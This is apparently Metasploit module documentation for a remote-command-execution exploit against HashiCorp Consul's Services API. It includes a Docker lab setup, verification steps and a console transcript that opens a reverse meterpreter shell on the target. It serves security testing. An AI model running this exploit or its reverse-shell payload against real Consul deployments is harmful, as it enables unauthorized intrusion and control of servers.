## Vulnerable Application

[HashiCorp Consul](https://www.consul.io/) with `-enable-script-checks` configuration flag set to true, or running version 0.9.0 or earlier, with Consul API available on an interface that can be accessed over the network.

### Description

This module exploits Hashicorp Consul's Services API to gain remote command execution on a Consul node.

The exposure of the Services API depends on the `enable_script_checks` option. This option is opt-in for Consul nodes operators.

### Test Setup

The following bash script can be used to setup a testing environment with Docker:

```
#!/bin/sh

echo "[+] Launching consul instances..."
BOOTSTRAP_ID=`docker run -p8301:8301 -d --name=consul_bootstrap_server consul:1.0.7 agent -server -client=0.0.0.0 -bootstrap -data-dir /tmp/consul`
sleep 2
BOOTSTRAP_IP=`docker inspect --format '{{ .NetworkSettings.IPAddress }}' $BOOTSTRAP_ID`
docker run -d --name=consul_client_1 -e 'CONSUL_LOCAL_CONFIG={"leave_on_terminate": true, "enable_script_checks":true, "disable_remote_exec":false}' consul:1.0.7 agent -ui -client=0.0.0.0 -retry-join=$BOOTSTRAP_IP
echo "[+] Checking members..."
docker exec -t consul_bootstrap_server consul members -http-addr="$BOOTSTRAP_IP:8500"
```

You should observe something similar to the excerpt below when running the script:

```
[+] Launching consul instances...
138b09eff12867fcc436b8f5d6366c5aebf3be54864789a675e133a865d436bf
[+] Checking members...
Node          Address          Status  Type    Build  Protocol  DC   Segment
36e14072dec5  172.17.0.1:8301  alive   server  1.0.7  2         dc1  <all>
138b09eff128  172.17.0.2:8301  alive   client  1.0.7  2         dc1  <default>
```

The following bash script can be used to stop and destroy **all your consul containers** (so be careful if you use consul containers for other things at the same time):

```
#!/bin/sh
for h in `sudo docker ps -a | grep consul | cut -d' ' -f1`; do sudo docker stop $h && sudo docker rm $h; done
```

## Verification Steps

You can verify the module against the vulnerable application with those steps:

  1. Launch a Consul cluster with the provided bash script
  2. Start msfconsole
  3. Do: `use exploit/multi/misc/consul_service_exec`
  4. Do: `set RHOST 172.17.0.2`
  5. Do: `set RPORT 8500`
  6. Do: `check`. The target should appear vulnerable.
  7. Do: `set payload` with the payload of your choosing.
  8. Do: `set LHOST 172.17.42.1` (docker0 gateway IP)
  9. Do: `run`
  10. You should get a shell.

## Scenarios

### Reverse shell on Linux host

Exploit running against a Docker [consul](https://hub.docker.com/_/consul/) container target:

```
msf5 > use exploit/multi/misc/consul_service_exec
msf5 exploit(multi/misc/consul_service_exec) > set RHOSTS 172.17.0.4
RHOSTS => 172.17.0.4
msf5 exploit(multi/misc/consul_service_exec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/misc/consul_service_exec) > set LHOST 172.17.42.1
LHOST => 172.17.42.1
msf5 exploit(multi/misc/consul_service_exec) > check
[+] 172.17.0.4:8500 The target is vulnerable.
msf5 exploit(multi/misc/consul_rexec_exec) > run

[*] Started reverse TCP handler on 172.17.42.1:4444
[*] Creating service 'BBBDX'
[*] Service 'BBBDX' successfully created.
[*] Waiting for service 'BBBDX' script to trigger
[*] Sending stage (861480 bytes) to 172.17.0.4
[*] Removing service 'BBBDX'
[*] Command Stager progress - 115.73% done (883/763 bytes)

meterpreter > sysinfo
Computer     : 172.17.0.4
OS           :  (Linux 4.4.0-38-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 172.17.0.4 - Meterpreter session 1 closed.  Reason: User exit
```
